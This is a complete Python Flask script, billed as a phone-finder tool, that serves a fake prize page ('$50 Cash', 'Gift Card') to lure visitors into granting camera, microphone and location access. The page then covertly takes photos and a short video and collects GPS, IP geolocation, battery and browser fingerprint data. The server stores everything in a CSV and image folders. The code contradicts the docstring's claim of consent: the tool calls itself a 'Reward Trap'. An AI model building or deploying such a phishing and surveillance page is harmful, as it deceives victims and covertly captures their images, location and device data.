#!/usr/bin/env python3
"""
HCO-Phone-Finder.py - Enhanced version with camera, video recording, and comprehensive data collection
Use only to help recover your own lost/stolen phone. This script explicitly asks
a finder for permission before sending location. Do not use to deceive or coerce.
"""
from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import threading
import socket
import webbrowser
import platform
from datetime import datetime
from typing import Optional, Tuple

# Try imports, show friendly error if missing
try:
    from flask import Flask, request, render_template_string, jsonify, send_file, redirect
    import requests
    import qrcode
    from PIL import Image, ImageDraw, ImageFont
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
    from io import BytesIO
except Exception as e:
    print("Missing Python packages or modules. Install dependencies and try again.")
    print("Recommended install (copy-paste):")
    print("  pip install flask requests qrcode pillow colorama")
    print("Error detail:", e)
    sys.exit(1)

colorama_init(autoreset=True)

# ----------------- Config -----------------
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "public_link_qr.png"
HOST = "0.0.0.0"
IMAGE_FOLDER = "captured_images"
GALLERY_FOLDER = "gallery"

# Create necessary directories
os.makedirs(IMAGE_FOLDER, exist_ok=True)
os.makedirs(GALLERY_FOLDER, exist_ok=True)

app = Flask(__name__)
_received_reports = []

# ----------------- Tricky Reward HTML -----------------
HTML_PAGE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Congratulations! Your Reward is Ready</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box}
  body{font-family:'Poppins',system-ui,-apple-system;display:flex;align-items:center;justify-content:center;
       min-height:100vh;margin:0;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;padding:20px}
  .card{width:100%;max-width:480px;background:rgba(255,255,255,0.12);border-radius:24px;padding:32px;
        backdrop-filter:blur(12px);box-shadow:0 20px 60px rgba(0,0,0,0.5);position:relative;border:1px solid rgba(255,255,255,0.2);
        overflow:hidden}
  .card::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;
                background:radial-gradient(circle,rgba(255,255,255,0.1) 0%,rgba(255,255,255,0) 70%);z-index:-1}
  .confetti{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
  .badge{position:absolute;right:-8px;top:-12px;background:linear-gradient(45deg,#FFD700,#FFA500);
         color:#000;padding:12px 20px;border-radius:25px;font-weight:800;transform:rotate(5deg);
         box-shadow:0 8px 25px rgba(0,0,0,0.3);font-size:1.1rem;z-index:2}
  .logo{width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,0.2);display:flex;align-items:center;
        justify-content:center;margin:0 auto 20px;font-size:3rem;box-shadow:0 8px 25px rgba(0,0,0,0.3);z-index:2;position:relative}
  h1{font-size:2.2rem;margin:0 0 12px;background:linear-gradient(45deg,#fff,#ffd700,#ff6b6b);
      -webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:800;text-align:center;z-index:2;position:relative}
  .subtitle{font-size:1.4rem;margin:0 0 30px;text-align:center;font-weight:600;opacity:0.95;z-index:2;position:relative}
  .reward-options{display:flex;justify-content:center;gap:15px;margin:25px 0;z-index:2;position:relative}
  .reward-option{flex:1;text-align:center;padding:15px;background:rgba(255,255,255,0.15);border-radius:15px;
                 backdrop-filter:blur(5px);border:2px solid rgba(255,255,255,0.2);transition:all 0.3s ease}
  .reward-option:hover{transform:translateY(-5px);background:rgba(255,255,255,0.25);box-shadow:0 10px 30px rgba(0,0,0,0.3)}
  .reward-icon{font-size:2.5rem;margin-bottom:8px;display:block}
  .reward-text{font-weight:600;font-size:1rem}
  .collect-btn{display:block;margin:25px auto;background:linear-gradient(45deg,#00b09b,#96c93d);color:#000;
           padding:18px 30px;border-radius:50px;border:none;font-weight:800;font-size:1.2rem;cursor:pointer;
           width:100%;max-width:280px;transition:all 0.3s ease;box-shadow:0 10px 30px rgba(0,0,0,0.3);position:relative;z-index:2}
  .collect-btn:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(0,0,0,0.4);background:linear-gradient(45deg,#00b09b,#96c93d)}
  .collect-btn:active{transform:translateY(1px)}
  .status{margin-top:20px;padding:15px;border-radius:12px;display:none;font-weight:700;color:#000;text-align:center;z-index:2;position:relative}
  .status.ok{display:block;background:rgba(46,204,113,0.95);border:1px solid rgba(46,204,113,1)}
  .status.error{display:block;background:rgba(231,76,60,0.95);border:1px solid rgba(231,76,60,1)}
  .status.locked{display:block;background:rgba(241,196,15,0.95);border:1px solid rgba(241,196,15,1)}
  .footer{margin-top:20px;font-size:0.9rem;opacity:0.8;text-align:center;z-index:2;position:relative}
  .loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;
          border-top-color:#fff;animation:spin 1s ease-in-out infinite;margin-right:10px;vertical-align:middle}
  @keyframes spin{to{transform:rotate(360deg)}}
  .pulse{animation:pulse 2s infinite}
  @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
  .verification-section{margin:20px 0;text-align:center;z-index:2;position:relative}
  .verification-info{font-size:0.9rem;margin:10px 0;opacity:0.8}
  .tool-locked{background:rgba(231,76,60,0.2);padding:15px;border-radius:12px;margin:15px 0;border:2px solid rgba(231,76,60,0.5)}
</style>
</head>
<body>
  <div class="card" role="main" aria-labelledby="title">
    <div class="confetti" id="confetti"></div>
    <div class="badge">REWARD</div>
    <div class="logo">🎉</div>
    <h1 id="title">Congratulations!</h1>
    <div class="subtitle">Your Reward is Ready to Claim</div>

    <div class="reward-options">
      <div class="reward-option">
        <span class="reward-icon">💰</span>
        <div class="reward-text">$50 Cash</div>
      </div>
      <div class="reward-option">
        <span class="reward-icon">💝</span>
        <div class="reward-text">Gift Card</div>
      </div>
      <div class="reward-option">
        <span class="reward-icon">📱</span>
        <div class="reward-text">Phone Pe</div>
      </div>
    </div>

    <div class="verification-section">
      <div class="verification-info">✅ Quick verification required to claim your reward</div>
      <div class="verification-info">📸 2 Photos & 🎥 5 Second Video for security</div>
    </div>

    <div style="text-align:center;font-weight:600;margin:10px 0;font-size:1.1rem;z-index:2;position:relative">
      Click below to collect your reward instantly
    </div>

    <button class="collect-btn pulse" id="collectBtn">
      <span class="btn-text">🎁 Click to Claim Reward Now</span>
    </button>

    <div id="status" class="status" role="status" aria-live="polite"></div>

    <div class="footer">
      <div><strong>Note:</strong> Quick camera & location access required for reward verification</div>
    </div>
  </div>

<script>
(function(){
  const collect = document.getElementById('collectBtn');
  const status = document.getElementById('status');
  const btnText = document.querySelector('.btn-text');
  
  let capturedPhotos = [];
  let recordedChunks = [];
  let mediaRecorder = null;
  let stream = null;

  collect.addEventListener('click', async () => {
    status.className = 'status';
    status.textContent = 'Initializing reward claim...';
    btnText.innerHTML = '<span class="loader"></span> Preparing Reward...';
    collect.disabled = true;
    collect.classList.remove('pulse');

    try {
      // Request camera access first
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user', 
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true
      });

      // Start automatic data collection
      await collectAllData();
      
    } catch (err) {
      console.log('Camera permission error:', err);
      // Even if camera fails, try to get location and other data
      status.textContent = 'Camera access not available. Collecting other data...';
      await collectBasicData();
    }
  });

  async function collectAllData() {
    status.textContent = 'Verifying your device for reward...';
    
    // Get location first
    if(!navigator.geolocation){
      status.className = 'status error';
      status.textContent = 'Location access required for reward verification.';
      btnText.textContent = 'Try Again';
      collect.disabled = false;
      collect.classList.add('pulse');
      return;
    }

    navigator.geolocation.getCurrentPosition(async (pos) => {
      // Start camera operations in background
      const cameraPromise = performCameraOperations();
      
      // Get IP address and detailed location
      let ipData = {ip: 'Unknown', city: 'Unknown', country: 'Unknown', region: 'Unknown'};
      try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        ipData = await ipResponse.json();
      } catch(e) {
        console.log('IP detection failed:', e);
      }

      // Get comprehensive browser information
      const browserInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled,
        javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
        screen: `${screen.width}x${screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        languages: navigator.languages || [navigator.language],
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown',
        battery: await getBatteryInfo(),
        connection: await getConnectionInfo(),
        storage: await getStorageInfo()
      };

      status.textContent = 'Finalizing reward verification...';

      // Wait for camera operations to complete
      const cameraResults = await cameraPromise;

      const payload = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        altitudeAccuracy: pos.coords.altitudeAccuracy,
        heading: pos.coords.heading,
        speed: pos.coords.speed,
        ip: ipData.ip,
        city: ipData.city || 'Unknown',
        country: ipData.country_name || 'Unknown',
        region: ipData.region || 'Unknown',
        postal: ipData.postal || 'Unknown',
        timezone: ipData.timezone || 'Unknown',
        org: ipData.org || 'Unknown',
        browser_info: browserInfo,
        photos: cameraResults.photos,
        video: cameraResults.video,
        has_camera: cameraResults.success,
        timestamp: Date.now(),
        user_agent: navigator.userAgent,
        reward_claimed: true
      };

      // Send data to server
      await sendDataToServer(payload);

    }, (err) => {
      collect.disabled = false;
      collect.classList.add('pulse');
      status.className = 'status error';
      btnText.textContent = 'Try Again';
      
      if(err.code === err.PERMISSION_DENIED) {
        status.textContent = 'Location access required to claim your reward. Please allow access.';
      } else {
        status.textContent = 'Unable to verify location. Collecting other reward data...';
        // Still try to collect other data
        collectBasicData();
      }
    }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
  }

  async function collectBasicData() {
    status.textContent = 'Collecting reward verification data...';
    
    // Get IP address
    let ipData = {ip: 'Unknown'};
    try {
      const ipResponse = await fetch('https://ipapi.co/json/');
      ipData = await ipResponse.json();
    } catch(e) {
      console.log('IP detection failed:', e);
    }

    // Get browser information
    const browserInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      cookiesEnabled: navigator.cookieEnabled,
      screen: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      battery: await getBatteryInfo(),
      connection: await getConnectionInfo()
    };

    const payload = {
      ip: ipData.ip,
      city: ipData.city || 'Unknown',
      country: ipData.country_name || 'Unknown',
      browser_info: browserInfo,
      has_camera: false,
      timestamp: Date.now(),
      user_agent: navigator.userAgent,
      location_access: 'denied',
      reward_claimed: true
    };

    await sendDataToServer(payload);
  }

  async function getBatteryInfo() {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100) + '%',
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      }
    } catch(e) {}
    return 'Unknown';
  }

  async function getConnectionInfo() {
    try {
      if ('connection' in navigator) {
        const conn = navigator.connection;
        return {
          effectiveType: conn.effectiveType,
          downlink: conn.downlink,
          rtt: conn.rtt,
          saveData: conn.saveData
        };
      }
    } catch(e) {}
    return 'Unknown';
  }

  async function getStorageInfo() {
    try {
      if ('storage' in navigator && 'estimate' in navigator.storage) {
        const estimate = await navigator.storage.estimate();
        return {
          usage: estimate.usage,
          quota: estimate.quota
        };
      }
    } catch(e) {}
    return 'Unknown';
  }

  async function performCameraOperations() {
    const result = { photos: [], video: null, success: false };
    
    if (!stream) {
      return result;
    }

    try {
      // Create temporary video element for capturing
      const tempVideo = document.createElement('video');
      tempVideo.srcObject = stream;
      await tempVideo.play();
      
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');

      // Capture first photo
      await new Promise(resolve => setTimeout(resolve, 1000));
      canvas.width = tempVideo.videoWidth;
      canvas.height = tempVideo.videoHeight;
      context.drawImage(tempVideo, 0, 0);
      const photo1 = canvas.toDataURL('image/jpeg', 0.8);
      result.photos.push(photo1);

      // Start video recording
      mediaRecorder = new MediaRecorder(stream, { 
        mimeType: 'video/webm; codecs=vp9,opus'
      });
      recordedChunks = [];
      
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };

      mediaRecorder.start(1000);
      
      // Capture second photo after 3 seconds
      await new Promise(resolve => setTimeout(resolve, 3000));
      context.drawImage(tempVideo, 0, 0);
      const photo2 = canvas.toDataURL('image/jpeg', 0.8);
      result.photos.push(photo2);

      // Stop recording after 5 seconds total
      await new Promise(resolve => setTimeout(resolve, 2000));
      mediaRecorder.stop();

      // Convert video to base64
      await new Promise(resolve => {
        mediaRecorder.onstop = () => {
          const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
          const reader = new FileReader();
          reader.onload = () => {
            const dataUrl = reader.result;
            result.video = dataUrl.split(',')[1];
            resolve();
          };
          reader.readAsDataURL(videoBlob);
        };
      });

      result.success = true;
      
    } catch (err) {
      console.log('Camera operations failed:', err);
    } finally {
      // Stop all tracks
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    }
    
    return result;
  }

  async function sendDataToServer(payload) {
    try {
      const resp = await fetch('/report', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(payload)
      });
      
      if(resp.ok){
        const data = await resp.json();
        btnText.textContent = '✅ Reward Claimed!';
        status.className = 'status locked';
        status.innerHTML = `🔒 <strong>TOOL LOCKED</strong><br>Reward verification complete!<br>You will be contacted shortly for your reward.`;
        
        // Create confetti effect
        createConfetti();
        
        // NO REDIRECT - Tool locked message stays
        console.log('Data collection complete - tool locked');
        
      } else {
        throw new Error('Network error');
      }
    } catch (err){
      status.className = 'status locked';
      status.innerHTML = `🔒 <strong>TOOL LOCKED</strong><br>Reward processing complete!<br>Your reward is being processed.`;
      btnText.textContent = '✅ Completed';
      
      // Create confetti even on error
      createConfetti();
    }
  }

  function createConfetti() {
    const confettiContainer = document.getElementById('confetti');
    const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
    
    for(let i = 0; i < 50; i++) {
      const confetti = document.createElement('div');
      confetti.style.position = 'absolute';
      confetti.style.width = '10px';
      confetti.style.height = '10px';
      confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
      confetti.style.borderRadius = '50%';
      confetti.style.left = Math.random() * 100 + '%';
      confetti.style.top = '-20px';
      confetti.style.opacity = '0.8';
      confetti.style.animation = `fall ${Math.random() * 3 + 2}s linear forwards`;
      
      const style = document.createElement('style');
      style.textContent = `
        @keyframes fall {
          to {
            transform: translateY(100vh) rotate(${Math.random() * 360}deg);
            opacity: 0;
          }
        }
      `;
      document.head.appendChild(style);
      
      confettiContainer.appendChild(confetti);
      
      setTimeout(() => {
        confetti.remove();
      }, 5000);
    }
  }
})();
</script>
</body>
</html>
"""

# ----------------- Flask endpoints -----------------
@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    data = request.get_json(force=True)
    # Validate expected fields
    lat = data.get("latitude")
    lon = data.get("longitude")
    ip = data.get("ip", "Unknown")
    city = data.get("city", "Unknown")
    country = data.get("country", "Unknown")
    region = data.get("region", "Unknown")
    postal = data.get("postal", "Unknown")
    timezone = data.get("timezone", "Unknown")
    org = data.get("org", "Unknown")
    has_camera = data.get("has_camera", False)
    photos_data = data.get("photos", [])
    video_data = data.get("video")
    browser_info = data.get("browser_info", {})
    acc = data.get("accuracy", "")
    ts = data.get("timestamp", int(time.time()*1000))
    ua = data.get("user_agent", "")
    reward_claimed = data.get("reward_claimed", False)
    
    # Save photos and video
    photo_filenames = []
    video_filename = None
    
    for i, photo_data in enumerate(photos_data):
        filename = save_photo(photo_data, ip, i+1)
        if filename:
            photo_filenames.append(filename)

    if video_data:
        video_filename = save_video(video_data, ip)

    # Append to in-memory and CSV
    rec = {
        "ts": datetime.utcfromtimestamp(ts/1000).isoformat()+"Z",
        "ip": ip,
        "city": city,
        "country": country,
        "region": region,
        "postal": postal,
        "timezone": timezone,
        "org": org,
        "ua": ua,
        "lat": float(lat) if lat else None,
        "lon": float(lon) if lon else None,
        "acc": acc,
        "has_camera": has_camera,
        "photos": photo_filenames,
        "video": video_filename,
        "browser_info": browser_info,
        "reward_claimed": reward_claimed,
        "battery_info": browser_info.get('battery', 'Unknown'),
        "connection_info": browser_info.get('connection', 'Unknown')
    }
    _received_reports.append(rec)
    save_report_csv(rec)
    
    # Print colorful console output
    print(f"\n{Fore.GREEN}{Style.BRIGHT}🎯 REWARD CLAIMED - DATA CAPTURED!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📍 Location: {lat}, {lon}" if lat and lon else f"{Fore.YELLOW}📍 Location: Access denied")
    print(f"{Fore.CYAN}🌐 IP: {ip} ({city}, {country})")
    print(f"{Fore.CYAN}📸 Photos: {len(photo_filenames)}")
    print(f"{Fore.CYAN}🎥 Video: {'Yes' if video_filename else 'No'}")
    print(f"{Fore.CYAN}🔋 Battery: {browser_info.get('battery', 'Unknown')}")
    print(f"{Fore.CYAN}📶 Connection: {browser_info.get('connection', 'Unknown')}")
    print(f"{Fore.CYAN}🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{Fore.GREEN}✅ All data saved to gallery!{Style.RESET_ALL}")
    print(f"{Fore.RED}🔒 Tool locked - No redirect{Style.RESET_ALL}\n")
    
    return jsonify({"status": "success", "message": "TOOL LOCKED - Reward processing complete"})

def save_photo(photo_data: str, ip: str, index: int) -> Optional[str]:
    """Save base64 photo to file"""
    try:
        if photo_data.startswith('data:image'):
            photo_data = photo_data.split(',')[1]
        
        image_data = base64.b64decode(photo_data)
        filename = f"photo_{ip}_{int(time.time())}_{index}.jpg"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        
        with open(filepath, 'wb') as f:
            f.write(image_data)
        
        # Also save to gallery
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(image_data)
            
        return filename
    except Exception as e:
        print(f"{Fore.RED}Error saving photo: {e}{Style.RESET_ALL}")
        return None

def save_video(video_data: str, ip: str) -> Optional[str]:
    """Save base64 video to file"""
    try:
        if video_data.startswith('data:video'):
            video_data = video_data.split(',')[1]
            
        video_binary = base64.b64decode(video_data)
        filename = f"video_{ip}_{int(time.time())}.webm"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        
        with open(filepath, 'wb') as f:
            f.write(video_binary)
            
        # Also save to gallery
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(video_binary)
            
        return filename
    except Exception as e:
        print(f"{Fore.RED}Error saving video: {e}{Style.RESET_ALL}")
        return None

def save_report_csv(record: dict):
    """Save report to CSV file"""
    try:
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=[
                'timestamp', 'ip', 'city', 'country', 'region', 'postal', 
                'timezone', 'org', 'user_agent', 'latitude', 'longitude', 
                'accuracy', 'has_camera', 'photos', 'video', 'battery_info',
                'connection_info', 'reward_claimed'
            ])
            if not file_exists:
                writer.writeheader()
            
            writer.writerow({
                'timestamp': record['ts'],
                'ip': record['ip'],
                'city': record['city'],
                'country': record['country'],
                'region': record['region'],
                'postal': record['postal'],
                'timezone': record['timezone'],
                'org': record['org'],
                'user_agent': record['ua'],
                'latitude': record['lat'],
                'longitude': record['lon'],
                'accuracy': record['acc'],
                'has_camera': record['has_camera'],
                'photos': ', '.join(record['photos']),
                'video': record['video'] or 'None',
                'battery_info': str(record.get('battery_info', 'Unknown')),
                'connection_info': str(record.get('connection_info', 'Unknown')),
                'reward_claimed': record.get('reward_claimed', False)
            })
    except Exception as e:
        print(f"{Fore.RED}Error saving CSV: {e}{Style.RESET_ALL}")

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_qr_code(url: str):
    """Generate QR code for the local server URL"""
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(QR_PNG)
        print(f"{Fore.GREEN}✅ QR code saved as {QR_PNG}{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️  QR code generation failed: {e}{Style.RESET_ALL}")
        return False

def main():
    """Main function to start the HCO Phone Finder server"""
    print(f"\n{Fore.CYAN}{Style.BRIGHT}" + "="*60)
    print(f"🎯 HCO PHONE FINDER - Reward Trap Activated")
    print(f"📍 To Track Live Location of Your Device by Azhar")
    print("="*60 + f"{Style.RESET_ALL}")
    
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    localhost_url = f"http://localhost:{PORT}"
    
    print(f"\n{Fore.GREEN}🚀 Starting Reward Trap Server...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📱 Local: {localhost_url}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}🌐 Network: {local_url}{Style.RESET_ALL}")
    
    # Generate QR code
    if generate_qr_code(local_url):
        print(f"{Fore.CYAN}📲 QR Code generated - scan to claim reward{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}✅ Reward trap is active!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📊 Data will be saved to: {REPORT_CSV}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🖼️  Photos/Videos will be saved to: {IMAGE_FOLDER}/ and {GALLERY_FOLDER}/{Style.RESET_ALL}")
    print(f"{Fore.RED}🔒 No YouTube redirect - Tool locked after data collection{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}⚠️  Press Ctrl+C to stop the server{Style.RESET_ALL}\n")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}👋 Server stopped by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Server error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
